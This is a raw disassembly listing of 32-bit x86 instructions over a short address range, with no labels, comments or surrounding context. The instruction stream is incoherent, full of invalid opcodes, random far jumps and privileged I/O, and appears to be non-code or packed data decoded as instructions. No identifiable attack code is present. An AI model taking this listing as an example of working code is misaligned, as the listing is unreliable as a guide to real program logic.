  41d43f:	imul   ecx,DWORD PTR [edi-0x3d96c9d9],0x18
  41d446:	scas   al,BYTE PTR es:[edi]
  41d447:	lahf   
  41d448:	in     eax,dx
  41d449:	in     al,0xbd
  41d44b:	jbe    0x41d447
  41d44d:	fld    DWORD PTR [edx-0xd5dcaee]
  41d453:	xor    eax,0x1b5b9293
  41d458:	mov    esi,DWORD PTR ds:0x2d61d836
  41d45e:	xor    BYTE PTR [ebx-0x40],bh
  41d461:	stc    
  41d462:	xchg   esi,eax
  41d463:	sti    
  41d464:	ror    cl,1
  41d466:	out    dx,eax
  41d467:	dec    ecx
  41d468:	dec    ecx
  41d469:	mov    DWORD PTR [ecx-0x765d99df],ebp
  41d46f:	sar    dh,cl
  41d471:	adc    ebp,esp
  41d473:	test   DWORD PTR cs:[edi+0x25],edi
  41d477:	add    ebp,esp
  41d479:	clc    
  41d47a:	shl    DWORD PTR [esi+edx*1],cl
  41d47d:	xor    eax,0x888b4553
  41d482:	loopne 0x41d4de
  41d484:	int3   
  41d485:	jmp    0x6bc0fb69
  41d48a:	mov    eax,0xb0e909be
  41d48f:	into   
  41d490:	or     DWORD PTR [esi+0x11],esp
  41d493:	pop    eax
  41d494:	mov    ch,0xd5
  41d496:	repz or ch,bh
  41d499:	xchg   ah,dh
  41d49b:	jo     0x41d4cf
  41d49d:	loop   0x41d43f
  41d49f:	mov    edi,0x9bbb93f7
  41d4a4:	jmp    0xe6653c35
  41d4a9:	cli    
  41d4aa:	mov    esi,0xd8ace9fd
  41d4af:	fisubr DWORD PTR [edi+0x2c6aa3a5]
  41d4b5:	cmp    BYTE PTR [ebp-0x17],0x14
  41d4b9:	pusha  
  41d4ba:	fs inc ebx
  41d4bc:	stos   DWORD PTR es:[edi],eax
  41d4bd:	sub    al,BYTE PTR [eax]
  41d4bf:	add    BYTE PTR [eax],al
  41d4c1:	add    dl,ah
  41d4c3:	or     al,BYTE PTR [ecx]
  41d4c5:	xchg   ecx,eax
  41d4c6:	jmp    0xbdbdc766
  41d4cb:	adc    esp,esi
  41d4cd:	pop    edi
  41d4ce:	shr    BYTE PTR [esi+ebp*2-0x55],0x4d
  41d4d3:	push   eax
  41d4d4:	add    DWORD PTR [eax],eax
  41d4d6:	hlt    
  41d4d7:	add    al,0x0
  41d4d9:	add    BYTE PTR [ebx],al
  41d4db:	ds scas eax,DWORD PTR es:[edi]
  41d4dd:	or     ecx,DWORD PTR [ecx]
  41d4df:	scas   al,BYTE PTR es:[edi]
  41d4e0:	mov    DWORD PTR [ebx],ebx
  41d4e2:	mov    ch,0xa3
  41d4e4:	pop    ecx
  41d4e5:	sbb    dh,BYTE PTR [eax-0x6a]
  41d4e8:	cmp    BYTE PTR [ecx],cl
  41d4ea:	daa    
  41d4eb:	rcl    DWORD PTR [ebx-0x6e],1
  41d4ee:	repz adc al,0x24
  41d4f1:	imul   eax,DWORD PTR [ebp+0x7e6b35f2],0xffffffff
  41d4f8:	test   BYTE PTR [edx],ah
  41d4fa:	sub    eax,esi
  41d4fc:	inc    esp
  41d4fd:	cdq    
  41d4fe:	icebp  
  41d4ff:	daa    
  41d500:	pop    edi
  41d501:	push   edi
  41d502:	(bad)  
  41d503:	dec    eax
  41d504:	es jne 0x41d541
  41d507:	xchg   edx,eax
  41d508:	sti    
  41d509:	sub    BYTE PTR [edx-0x14],dl
  41d50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d50d:	pop    edx
  41d50e:	out    0x41,eax
  41d510:	mov    eax,ds:0x94ba0211
  41d515:	dec    ecx
  41d516:	fisubr WORD PTR [ebx-0x3ba10a9f]
  41d51c:	out    0x24,eax
  41d51e:	and    esi,DWORD PTR [esi]
  41d520:	ror    DWORD PTR [edx-0x57eceb00],0x74
  41d527:	dec    edx
  41d528:	mov    al,ds:0x54a2b009
  41d52d:	(bad)  
  41d52e:	mov    al,0xcd
  41d530:	shl    dh,0x4b
  41d533:	mov    es,WORD PTR [ecx+0x1f]
  41d536:	adc    eax,0x50da7d4c
  41d53b:	leave  
  41d53c:	cmp    eax,ebx
  41d53e:	scas   al,BYTE PTR es:[edi]
  41d53f:	mov    ch,0xe
  41d541:	fimul  WORD PTR [edi+ebp*1+0x15f1c40a]
  41d548:	sbb    eax,0x1f05a91b
  41d54d:	fwait
  41d54e:	ror    edx,1
  41d550:	inc    BYTE PTR [eax+0x65]
  41d553:	or     ecx,DWORD PTR [ebp-0x701cc594]
  41d559:	lods   al,BYTE PTR ds:[esi]
  41d55a:	retf   0x750e
  41d55d:	mov    cl,0x41
  41d55f:	jo     0x41d504
  41d561:	sub    DWORD PTR [ecx+0x53],ebx
  41d564:	xchg   edx,eax
  41d565:	sub    cl,BYTE PTR [edx]
  41d567:	sahf   
  41d568:	cmp    ah,bl
  41d56a:	fimul  WORD PTR [eax-0x74]
  41d56d:	arpl   WORD PTR fs:[edx-0x6c],bx
  41d571:	push   ecx
  41d572:	add    edx,0xae79018f
  41d578:	shl    DWORD PTR [ebp+0x79972deb],cl
  41d57e:	test   eax,0x75ef62f5
  41d583:	push   edx
  41d584:	fwait
  41d585:	es int3 
  41d587:	out    0xda,eax
  41d589:	out    0x69,eax
  41d58b:	dec    ebp
  41d58c:	idiv   DWORD PTR [edi+0x19b1befc]
  41d592:	popa   
  41d593:	jne    0x41d585
  41d595:	daa    
  41d596:	cmp    DWORD PTR [ecx-0x43e858ab],0x99aa5a45
  41d5a0:	ins    BYTE PTR es:[edi],dx
  41d5a1:	pop    edx
  41d5a2:	jg     0x41d5de
  41d5a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5a5:	retf   0x2a0a
  41d5a8:	sbb    ah,BYTE PTR [ebx-0x3570f0cf]
  41d5ae:	dec    edx
  41d5af:	ret    
  41d5b0:	aas    
  41d5b1:	xchg   ebp,eax
  41d5b2:	mov    dh,bh
  41d5b4:	idiv   BYTE PTR [edx+0x26ab7b4f]
  41d5ba:	dec    esp
  41d5bb:	xor    DWORD PTR [ebp-0x1d],esi
  41d5be:	shl    DWORD PTR [ecx],1
  41d5c0:	adc    DWORD PTR [esi-0x73cb9061],ecx
  41d5c6:	aaa    
  41d5c7:	mov    esp,0x2eaa8de9
  41d5cc:	fwait
  41d5cd:	or     eax,0x87e79dc
  41d5d2:	sub    al,0x98
  41d5d4:	aaa    
  41d5d5:	adc    cl,BYTE PTR [edx-0x4329f175]
  41d5db:	lods   eax,DWORD PTR ds:[esi]
  41d5dc:	xor    DWORD PTR [edx+0x63],edi
  41d5df:	jg     0x41d65b
  41d5e1:	add    DWORD PTR [edi],edi
  41d5e3:	arpl   WORD PTR ds:0xd3d706dd,cx
  41d5e9:	call   0x8201c4e9
  41d5ee:	or     al,BYTE PTR [ecx]
  41d5f0:	stos   DWORD PTR es:[edi],eax
  41d5f1:	retf   
  41d5f2:	xchg   edx,eax
  41d5f3:	sbb    al,0xf1
  41d5f5:	or     al,0x23
  41d5f7:	out    dx,eax
  41d5f8:	cmp    DWORD PTR [edi+0x411734b7],ebx
  41d5fe:	fcom   QWORD PTR [ecx]
  41d600:	dec    esi
  41d601:	loop   0x41d5e8
  41d603:	push   cs
  41d604:	mov    ds:0x54f7f158,al
  41d609:	lods   al,BYTE PTR ds:[esi]
  41d60a:	inc    edi
  41d60b:	or     bl,BYTE PTR [edi-0x7952316b]
  41d611:	inc    ebp
  41d612:	and    ah,BYTE PTR [ecx]
  41d614:	push   esi
  41d615:	mov    cl,BYTE PTR [eax+ebx*1-0x5d]
  41d619:	jbe    0x41d61d
  41d61b:	ret    0xa7eb
  41d61e:	jmp    0x41d5bc
  41d620:	mov    al,ds:0x34d0e3f7
  41d625:	sti    
  41d626:	stos   DWORD PTR es:[edi],eax
  41d627:	inc    edx
  41d628:	aaa    
  41d629:	add    al,0xfc
  41d62b:	retf   0x5ed8
  41d62e:	in     al,dx
  41d62f:	dec    edx
  41d630:	fsubp  st(4),st
  41d632:	int    0xdd
  41d634:	leave  
  41d635:	ror    DWORD PTR [ecx-0x6ce46359],1
  41d63b:	or     ebp,DWORD PTR [ebp-0x6beee521]
  41d641:	loop   0x41d683
  41d643:	push   cs
  41d644:	sbb    DWORD PTR [edi+0x16],esi
  41d647:	adc    BYTE PTR [edx+ebp*1-0x2],bl
  41d64b:	(bad)
  41d64e:	adc    eax,0x420517b8
  41d653:	push   es
  41d654:	add    BYTE PTR [edx],bh
  41d656:	(bad)  
  41d657:	out    0x75,al
  41d659:	mov    al,BYTE PTR [edi-0x5e]
  41d65c:	mov    ah,0x16
  41d65e:	xchg   BYTE PTR [ebx-0x16],ah
  41d661:	adc    esp,DWORD PTR [edx+0x2]
  41d664:	mov    ebx,0x583052d9
  41d669:	sub    al,0xb8
  41d66b:	nop
  41d66c:	jns    0x41d6e8
  41d66e:	daa    
  41d66f:	stos   BYTE PTR es:[edi],al
  41d670:	(bad)  
  41d671:	dec    edi
  41d672:	daa    
  41d673:	inc    ecx
  41d674:	mov    bl,0xa7
  41d676:	push   edx
  41d677:	sbb    eax,0xe9ff2551
  41d67c:	sbb    cl,BYTE PTR [edx-0x357da976]
  41d682:	mov    DWORD PTR [esi],ebx
  41d684:	stc    
  41d685:	and    esp,DWORD PTR [esi]
  41d687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d688:	pushf  
  41d689:	test   eax,0x70fdaed9
  41d68e:	clc    
  41d68f:	jle    0x41d6da
  41d691:	sub    DWORD PTR [bp+0x7641],edi
  41d696:	push   ecx
  41d697:	and    al,0x3c
  41d699:	cmp    ebp,DWORD PTR [esi-0x25]
  41d69c:	inc    esi
  41d69d:	push   ds
  41d69e:	mov    ebp,0xf6ea9930
  41d6a3:	outs   dx,DWORD PTR ds:[esi]
  41d6a4:	lods   eax,DWORD PTR ds:[esi]
  41d6a5:	mov    edi,DWORD PTR [eax]
  41d6a7:	pop    ebx
  41d6a8:	jmp    0x5df5:0x8488a342
  41d6af:	and    al,0x92
  41d6b1:	ror    ch,1
  41d6b3:	xchg   DWORD PTR [edi+0x68],edi
  41d6b6:	push   eax
  41d6b7:	aam    0x87
  41d6b9:	mov    ch,BYTE PTR [ecx+edx*1+0x2ae231b]
  41d6c0:	outs   dx,BYTE PTR ds:[esi]
  41d6c1:	jmp    0x65c9:0x21e498c6
  41d6c8:	(bad)  
  41d6c9:	neg    DWORD PTR [edi+0xe]
  41d6cc:	int    0x22
  41d6ce:	(bad)  
  41d6cf:	ficom  DWORD PTR [eax+0x5b3a5634]
  41d6d5:	clc    
  41d6d6:	push   ebx
  41d6d7:	jno    0x41d702
  41d6d9:	retf   
  41d6da:	jns    0x41d73d
  41d6dc:	daa    
  41d6dd:	sub    al,0x59
  41d6df:	inc    esi
  41d6e0:	xlat   BYTE PTR ds:[ebx]
  41d6e1:	mov    ds:0xc38d84ee,al
  41d6e6:	push   edi
  41d6e7:	es jae 0x41d6ac
  41d6ea:	rcr    BYTE PTR [eax-0x5b3c5326],cl
  41d6f0:	int    0xb8
  41d6f2:	lea    ecx,[edx]
  41d6f4:	leave  
  41d6f5:	adc    BYTE PTR [eax-0x8518c27],al
  41d6fb:	ss ds std 
  41d6fe:	sbb    eax,0xecdcffce
  41d703:	xlat   BYTE PTR ds:[ebx]
  41d704:	in     eax,dx
  41d705:	cld    
  41d706:	aad    0x36
  41d708:	jmp    0xc4c7719
  41d70d:	push   esi
  41d70e:	jno    0x41d6ff
  41d710:	inc    edi
  41d711:	dec    edi
  41d712:	pop    ds
  41d713:	pop    eax
  41d714:	push   esi
  41d715:	inc    edi
  41d716:	out    0xce,eax
  41d718:	xchg   esi,eax
  41d719:	sar    ebp,1
  41d71b:	pop    ebp
  41d71c:	scas   al,BYTE PTR es:[edi]
  41d71d:	mov    dh,0xc1
  41d71f:	(bad)  
  41d720:	inc    edx
  41d721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d722:	sbb    BYTE PTR [edi-0x26871c97],bh
  41d728:	jecxz  0x41d70f
  41d72a:	shr    DWORD PTR [ecx+0x60],cl
  41d72d:	(bad)  
  41d72e:	push   esp
  41d72f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41d731:	push   ebx
  41d732:	lock jo 0x41d7a8
  41d735:	adc    BYTE PTR [edi+0x4955a888],dh
  41d73b:	adc    BYTE PTR [edi],al
  41d73d:	stc    
  41d73e:	adc    ecx,eax
  41d740:	mov    ah,BYTE PTR [ebp+0x8]
  41d743:	cmp    eax,0x908d554e
  41d748:	dec    esi
  41d749:	push   ds
  41d74a:	mov    ah,0xf7
  41d74c:	pop    ebp
  41d74d:	push   cs
  41d74e:	xor    dh,BYTE PTR ds:0x83dbfe6b
  41d754:	(bad)  
  41d755:	cmp    esi,DWORD PTR [ebx+0x63]
  41d758:	sbb    al,0x8a
  41d75a:	mov    esp,0x9abd9a93
  41d75f:	cmp    BYTE PTR cs:[edi+0x6f],ch
  41d763:	gs call 0x1d8cb15e
  41d769:	fst    DWORD PTR [eax+0x3a]
  41d76c:	push   eax
  41d76d:	test   DWORD PTR [edx-0x30edc3af],edi
  41d773:	xchg   edx,eax
  41d774:	sbb    cl,bl
  41d776:	bound  esp,QWORD PTR [ebx]
  41d778:	inc    edi
  41d779:	dec    edx
  41d77a:	dec    esp
  41d77b:	pop    ss
  41d77c:	push   cs
  41d77d:	out    dx,al
  41d77e:	jbe    0x41d798
  41d780:	pop    ebx
  41d781:	into   
  41d782:	inc    esi
  41d783:	or     esp,DWORD PTR [edi]
  41d785:	lock sub eax,0x4714b68d
  41d78b:	mul    BYTE PTR [edx]
  41d78d:	mov    ecx,0xb1dd5b08
  41d792:	add    BYTE PTR [ebx],dl
  41d794:	call   0xd70b76fc
  41d799:	out    dx,eax
  41d79a:	js     0x41d815
  41d79c:	mov    WORD PTR [esi],ss
  41d79e:	fsubr  st(6),st
  41d7a0:	push   edi
  41d7a1:	jno    0x41d7ed
  41d7a3:	in     al,dx
  41d7a4:	pushf  
  41d7a5:	cdq    
  41d7a6:	ret    0x785a
  41d7a9:	cmp    eax,0x66028bd2
  41d7ae:	add    dh,BYTE PTR [esp+eax*8]
  41d7b1:	jmp    0x41d7ec
  41d7b3:	inc    DWORD PTR [edx-0x2ffb1009]
  41d7b9:	adc    al,cl
  41d7bb:	enter  0xa3c2,0x24
  41d7bf:	sbb    al,ch
  41d7c1:	sti    
  41d7c2:	cmp    bh,dl
  41d7c4:	inc    ebx
  41d7c5:	inc    edx
  41d7c6:	fcom   QWORD PTR [esi]
  41d7c8:	imul   ebp,DWORD PTR [esi-0x3bfcbe38],0x70f1411d
  41d7d2:	imul   ch
  41d7d4:	test   al,0x9d
  41d7d6:	push   ebx
  41d7d7:	outs   dx,DWORD PTR ds:[esi]
  41d7d8:	sbb    cl,al
  41d7da:	jns    0x41d842
  41d7dc:	push   es
  41d7dd:	fild   QWORD PTR [edi+0x69e28bee]
  41d7e3:	int3   
  41d7e4:	out    dx,eax
  41d7e5:	xor    ah,BYTE PTR [esi+0xe]
  41d7e8:	and    BYTE PTR [esi-0x4b],al
  41d7eb:	shr    DWORD PTR [ecx+0x64],cl
  41d7ee:	test   ecx,ecx
  41d7f0:	mov    eax,ds:0x72cc937e
  41d7f5:	outs   dx,DWORD PTR ds:[esi]
  41d7f6:	test   al,0x9e
  41d7f8:	aam    0xe4
  41d7fa:	xor    dh,BYTE PTR [eax-0x3b]
  41d7fd:	adc    BYTE PTR [ebp-0x3a],dl
  41d800:	lock ja 0x41d79e
  41d803:	stos   DWORD PTR es:[edi],eax
  41d804:	sbb    eax,0x1cd39c1c
  41d809:	sti    
  41d80a:	ja     0x41d87b
  41d80c:	sub    edi,ebp
  41d80e:	pop    ebp
  41d80f:	daa    
  41d810:	pop    edx
  41d811:	shl    ebp,1
  41d813:	pop    ss
  41d814:	sub    BYTE PTR [ecx],cl
  41d816:	scas   eax,DWORD PTR es:[edi]
  41d817:	leave  
  41d818:	cmp    al,0xc1
  41d81a:	jae    0x41d88e
  41d81c:	cmp    eax,esi
  41d81e:	jnp    0x41d862
  41d820:	inc    edx
  41d821:	jecxz  0x41d7f3
  41d823:	jmp    0xfb0f:0x90c8cff3
  41d82a:	pop    eax
  41d82b:	outs   dx,DWORD PTR ds:[esi]
  41d82c:	pushf  
  41d82d:	fsub   st(5),st
  41d82f:	lahf   
  41d830:	mov    bl,0x1d
  41d832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d833:	sub    al,0xd4
  41d835:	std    
  41d836:	loop   0x41d815
  41d838:	(bad)  
  41d839:	lods   eax,DWORD PTR ds:[esi]
  41d83a:	xor    esp,edx
  41d83c:	adc    BYTE PTR [ebx+0x3d9d7441],0x1e
  41d843:	mov    WORD PTR [ebx-0x68],?
  41d846:	imul   edi,DWORD PTR [edx-0xa],0xb9a3c3d
  41d84d:	pop    fs
  41d84f:	outs   dx,DWORD PTR ds:[esi]
  41d850:	mov    al,0x13
  41d852:	(bad)  
  41d854:	dec    eax
  41d855:	retf   0xa87c
  41d858:	add    BYTE PTR [ecx-0x75a91a9],dh
  41d85e:	jmp    DWORD PTR [eax]
  41d860:	test   eax,0xd3e78afc
  41d865:	inc    ecx
  41d866:	sbb    BYTE PTR [eax+0x69],cl
  41d869:	and    al,0x55
  41d86b:	je     0x41d825
  41d86d:	and    BYTE PTR [ecx],0x2d
  41d870:	out    dx,eax
  41d871:	cmp    edx,DWORD PTR [ecx]
  41d873:	iret   
  41d874:	inc    eax
  41d875:	pop    edx
  41d876:	cmp    eax,0xae549ab
  41d87b:	loope  0x41d83c
  41d87d:	pop    es
  41d87e:	mov    bl,0x63
  41d880:	popa   
  41d881:	push   0xaf5df2c
  41d886:	enter  0xa0b8,0x6d
  41d88a:	fmul   QWORD PTR [ecx-0x2a]
  41d88d:	adc    eax,0x9a1a468f
  41d892:	or     DWORD PTR [eax+ebp*2],0x77b57fb
  41d899:	and    eax,0x60202f07
  41d89e:	adc    BYTE PTR cs:[ecx-0x35c39af0],ah
  41d8a5:	xor    al,0x8d
  41d8a7:	test   BYTE PTR [esi],ch
  41d8a9:	push   0x12
  41d8ab:	jp     0x41d8d3
  41d8ad:	dec    eax
  41d8ae:	sbb    ebx,0x6b066466
  41d8b4:	div    DWORD PTR [eax]
  41d8b6:	cmp    ch,al
  41d8b8:	jl     0x41d930
  41d8ba:	xchg   ecx,eax
  41d8bb:	pop    ebx
  41d8bc:	inc    ebx
  41d8bd:	jecxz  0x41d87b
  41d8bf:	call   0x27eb:0xe6f8c5c3
  41d8c6:	loope  0x41d852
  41d8c8:	mov    edi,0x22b2aa2f
  41d8cd:	dec    esi
  41d8ce:	adc    ch,BYTE PTR [ebp+0x19]
  41d8d1:	pop    edi
  41d8d2:	and    DWORD PTR [edi],esp
  41d8d4:	in     al,0x91
  41d8d6:	retf   
  41d8d7:	inc    edi
  41d8d8:	rcl    bh,1
  41d8da:	and    eax,0x1215d585
  41d8df:	sahf   
  41d8e0:	data16 (bad) 
  41d8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e3:	or     eax,0xf75fa794
  41d8e8:	sbb    DWORD PTR [edx-0x17c0f4ec],ecx
  41d8ee:	and    al,0x2
  41d8f0:	jecxz  0x41d8cb
  41d8f2:	push   ds
  41d8f3:	jbe    0x41d88f
  41d8f5:	xchg   esi,eax
  41d8f6:	mov    WORD PTR [ebp+0x60],es
  41d8f9:	lds    ebp,FWORD PTR [esi+0x5f95e1ee]
  41d8ff:	inc    esi
  41d900:	aaa    
  41d901:	adc    DWORD PTR [ebp-0x423adb4e],ebx
  41d907:	jge    0x41d974
  41d909:	lahf   
  41d90a:	test   al,0x45
  41d90c:	(bad)
  41d90f:	cmp    BYTE PTR [ecx-0x5c],dh
  41d912:	lock ret 
  41d914:	rcr    BYTE PTR [ecx+ebx*2+0x662a97b9],0xcf
  41d91c:	jno    0x41d955
  41d91e:	lock jns 0x41d974
  41d921:	fld    TBYTE PTR [ebx-0x3664b46d]
  41d927:	mov    al,ds:0xda5d4c82
  41d92c:	imul   edi,esi,0x3
  41d92f:	and    BYTE PTR [ebx+0x13f14877],ch
  41d935:	fnsave [ebp-0x438e8ce7]
  41d93b:	or     eax,edx
  41d93d:	pop    edi
  41d93e:	addr16 aas 
  41d940:	xchg   edx,eax
  41d941:	adc    al,BYTE PTR [ebp+0x23]
  41d944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d946:	jmp    0x9a8ae346
  41d94b:	jo     0x41d905
  41d94d:	mov    ch,0xd7
  41d94f:	cdq    
  41d950:	pop    esp
  41d951:	mov    al,0x1
  41d953:	inc    esp
  41d954:	push   ds
  41d955:	je     0x41d944
  41d957:	fst    QWORD PTR [ecx-0x3a005930]
  41d95d:	mov    cs,WORD PTR ds:[edx-0x31]
  41d961:	jmp    FWORD PTR [edi-0x7a67c23b]
  41d967:	(bad)  
  41d968:	out    dx,al
  41d969:	xor    eax,0xeaa4156f
  41d96e:	and    DWORD PTR [eax],ebp
  41d970:	fwait
  41d971:	popf   
  41d972:	jl     0x41d9cd
  41d974:	je     0x41d901
  41d976:	lahf   
  41d977:	mov    edi,0x147b3506
  41d97c:	jns    0x41d9c4
  41d97e:	retf   0x5c95
  41d981:	outs   dx,DWORD PTR ds:[esi]
  41d982:	iret   
  41d983:	xlat   BYTE PTR ds:[ebx]
  41d984:	jmp    0x41d94c
  41d986:	cwde   
  41d987:	loope  0x41d9b2
  41d989:	shr    DWORD PTR [edx+ecx*4+0x77],0x78
  41d98e:	aad    0xf4
  41d990:	mov    gs,WORD PTR [esi]
  41d992:	inc    esi
  41d993:	and    BYTE PTR [esi-0x5d],bh
  41d996:	and    DWORD PTR [ecx-0x53a9183c],ebp
  41d99c:	or     ch,ch
  41d99e:	inc    ebx
  41d99f:	int    0xae
  41d9a1:	cmp    al,0xa7
  41d9a3:	enter  0x398e,0x2a
  41d9a7:	adc    BYTE PTR [eax-0x13871266],ah
  41d9ad:	dec    ecx
  41d9ae:	inc    eax
  41d9af:	fwait
  41d9b0:	xor    DWORD PTR [eax-0x51],ebp
  41d9b3:	ins    BYTE PTR es:[edi],dx
  41d9b4:	int3   
  41d9b5:	fsub   DWORD PTR gs:[ebx+0x3a7cd7c6]
  41d9bc:	push   ecx
  41d9bd:	call   0xa3c114d8
  41d9c2:	retf   
  41d9c3:	js     0x41d9fb
  41d9c5:	es (bad) 
  41d9c7:	sbb    al,BYTE PTR [edx]
  41d9c9:	cmp    al,0xf6
  41d9cb:	shr    BYTE PTR [eax+0xd3],1
  41d9d1:	add    BYTE PTR [esi+0x5e],bl
  41d9d4:	loope  0x41da44
  41d9d6:	loope  0x41d9d7
  41d9d8:	fistp  QWORD PTR [esi-0x6e]
  41d9db:	adc    DWORD PTR [esi],0xa
  41d9de:	imul   eax,ebp,0x55414f9d
  41d9e4:	add    DWORD PTR [eax],eax
  41d9e6:	hlt    
  41d9e7:	add    al,0x0
  41d9e9:	add    BYTE PTR [ebp+ecx*1+0x4fafb6f5],cl
  41d9f0:	in     eax,dx
  41d9f1:	cli    
  41d9f2:	btc    DWORD PTR [esi+0x57270acc],eax
  41d9f9:	ret    0xf0fd
  41d9fc:	and    ecx,DWORD PTR [eax+0x23]
  41d9ff:	add    dh,BYTE PTR [eax]
  41da01:	mov    esp,0xf7f01b71
  41da06:	xchg   edi,eax
  41da07:	stc    
  41da08:	out    dx,eax
  41da09:	loope  0x41d9a7
  41da0b:	cmp    edi,DWORD PTR [edi]
  41da0d:	adc    eax,0xac3623f9
  41da12:	in     eax,dx
  41da13:	bnd ja 0x41d9e6
  41da16:	fiadd  DWORD PTR [eax-0x5ea5b4db]
  41da1c:	xor    ecx,DWORD PTR cs:[edi]
  41da1f:	jmp    0xffa9c32b
  41da24:	imul   esp,edx,0x90968c58
  41da2a:	ret    0x9b64
  41da2d:	or     edi,eax
  41da2f:	int3   
  41da30:	int    0xa5
  41da32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da33:	shl    DWORD PTR [eax-0x14],1
  41da36:	push   edi
  41da37:	adc    ebp,DWORD PTR [edx]
  41da39:	ja     0x41da6f
  41da3b:	ret    0x195d
  41da3e:	pop    ds
  41da3f:	mov    bl,0xd7
  41da41:	repnz cs out 0xab,al
  41da45:	push   esp
  41da46:	pop    edi
  41da47:	jns    0x41d9eb
  41da49:	dec    edi
  41da4a:	mov    BYTE PTR [ebx+ebx*1-0x6a283093],cl
  41da51:	sbb    DWORD PTR [eax],eax
  41da53:	fwait
  41da54:	xchg   esi,eax
  41da55:	mov    WORD PTR [ebx-0x2f],gs
  41da58:	out    dx,al
  41da59:	(bad)  
  41da5a:	std    
  41da5b:	stc    
  41da5c:	add    DWORD PTR [ebp-0x3314cddc],esi
  41da62:	mov    ecx,0x7a2dd0b3
  41da67:	pusha  
  41da68:	xor    edi,DWORD PTR [ebp-0x1625aac0]
  41da6e:	xor    al,0x13
  41da70:	imul   esp,DWORD PTR [ecx-0x6dd4e802],0xffffffe4
  41da77:	sub    edi,ecx
  41da79:	cdq    
  41da7a:	retf   
  41da7b:	push   ss
  41da7c:	mov    esi,DWORD PTR [esi+0x623465b5]
  41da82:	mov    ds:0x1a15dd9,eax
  41da87:	xchg   DWORD PTR [esi+eax*4-0x3],ebx
  41da8b:	push   edi
  41da8c:	ins    BYTE PTR es:[edi],dx
  41da8d:	inc    esi
  41da8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da8f:	dec    ecx
  41da90:	nop
  41da91:	mov    dh,0xdf
  41da93:	lods   al,BYTE PTR ds:[esi]
  41da94:	js     0x41da72
  41da96:	jp     0x41daf9
  41da98:	xabort 0xcd
  41da9b:	pop    esp
  41da9c:	sbb    al,0x3f
  41da9e:	stos   BYTE PTR es:[edi],al
  41da9f:	inc    ecx
  41daa0:	and    ebp,DWORD PTR [ebp-0x7f57c125]
  41daa6:	pop    ss
  41daa7:	adc    DWORD PTR [esi-0x40],0x97d7605
  41daae:	(bad)  
  41dab0:	inc    BYTE PTR [edx]
  41dab2:	arpl   bx,ax
  41dab4:	push   edx
  41dab5:	fdivr  QWORD PTR [esi+0x527c3b11]
  41dabb:	addr16 popa 
  41dabd:	mov    edi,0x1f70eb92
  41dac2:	xor    ebx,DWORD PTR [esp+ebx*8-0x67]
  41dac6:	mov    ebp,0x3c04cbc0
  41dacb:	add    dl,BYTE PTR [ebx+0x2fcde33d]
  41dad1:	leave  
  41dad2:	dec    esi
  41dad3:	xor    al,0x75
  41dad5:	adc    eax,0xe404f768
  41dada:	into   
  41dadb:	add    al,BYTE PTR [edi+0x4]
  41dade:	push   ecx
  41dadf:	in     al,0xcf
  41dae1:	sub    ch,cl
  41dae3:	adc    eax,0x4cfe65de
  41dae8:	ret    
  41dae9:	jmp    0x9040:0xf806c19
  41daf0:	stc    
  41daf1:	jmp    0xbdb0:0x6eea8e8d
  41daf8:	mov    dh,0xc0
  41dafa:	pop    es
  41dafb:	add    edx,edx
  41dafd:	js     0x41daab
  41daff:	fnstsw WORD PTR [edx-0x176a527b]
  41db05:	xchg   edi,eax
  41db06:	add    BYTE PTR [edx-0x47],bh
  41db09:	inc    edi
  41db0a:	ficom  WORD PTR [esi+eax*4-0x4f3e80b6]
  41db11:	(bad)  
  41db12:	mov    edi,0xf33b60ef
  41db17:	xchg   BYTE PTR [ecx-0x47d9a44c],dh
  41db1d:	nop
  41db1e:	ret    0xf23c
  41db21:	arpl   WORD PTR [edi-0x76c82df0],dx
  41db27:	cmp    esp,DWORD PTR [esi+0x6720ba33]
  41db2d:	daa    
  41db2e:	(bad)  
  41db2f:	scas   eax,DWORD PTR es:[edi]
  41db30:	mov    al,0x25
  41db32:	(bad)  
  41db33:	rol    BYTE PTR [edi+0x57939ee7],cl
  41db39:	jg     0x41dac1
  41db3b:	daa    
  41db3c:	jmp    0x41db13
  41db3e:	mov    ah,0x33
  41db40:	sbb    bh,BYTE PTR [edi]
  41db42:	jbe    0x41db13
  41db44:	mov    al,0x45
  41db46:	or     cl,dl
  41db48:	fidiv  WORD PTR ds:0x2f0bd82f
  41db4e:	fisubr DWORD PTR [esi]
  41db50:	test   al,0xc1
  41db52:	int3   
  41db53:	int    0x1f
  41db55:	call   0xab18a605
  41db5a:	fldcw  WORD PTR [edx+0x5]
  41db5d:	jp     0x41db30
  41db5f:	(bad)  
  41db61:	je     0x41db6a
  41db63:	jb     0x41dbad
  41db65:	sbb    edx,DWORD PTR [si-0x56]
  41db69:	and    ebp,edx
  41db6b:	ss loopne 0x41db81
  41db6e:	int3   
  41db6f:	retf   
  41db70:	in     eax,0xfd
  41db72:	adc    DWORD PTR [edi+ecx*2+0x1d4f293b],0x63
  41db7a:	xchg   edx,eax
  41db7b:	dec    ebx
  41db7c:	in     al,0xdb
  41db7e:	push   ebx
  41db7f:	hlt    
  41db80:	loope  0x41dba5
  41db82:	pop    es
  41db83:	mov    esi,0x3ba50b67
  41db88:	call   0x6951b25f
  41db8d:	push   esp
  41db8e:	adc    ebx,DWORD PTR [ebx-0x5ae7ca33]
  41db94:	std    
  41db95:	mov    ch,0x90
  41db97:	mov    dl,0xe1
  41db99:	xchg   ebp,eax
  41db9a:	mov    al,ds:0x4053e26b
  41db9f:	ins    DWORD PTR es:[edi],dx
  41dba0:	fst    DWORD PTR [edx-0x6b]
  41dba3:	jns    0x41db6e
  41dba5:	sub    DWORD PTR [eax],ecx
  41dba7:	push   ss
  41dba8:	data16 add al,0xff
  41dbab:	inc    esp
  41dbac:	into   
  41dbad:	std    
  41dbae:	and    esi,ebx
  41dbb0:	loope  0x41db55
  41dbb2:	enter  0x3d87,0x28
  41dbb6:	mov    edx,0x61cd4f35
  41dbbb:	aam    0x63
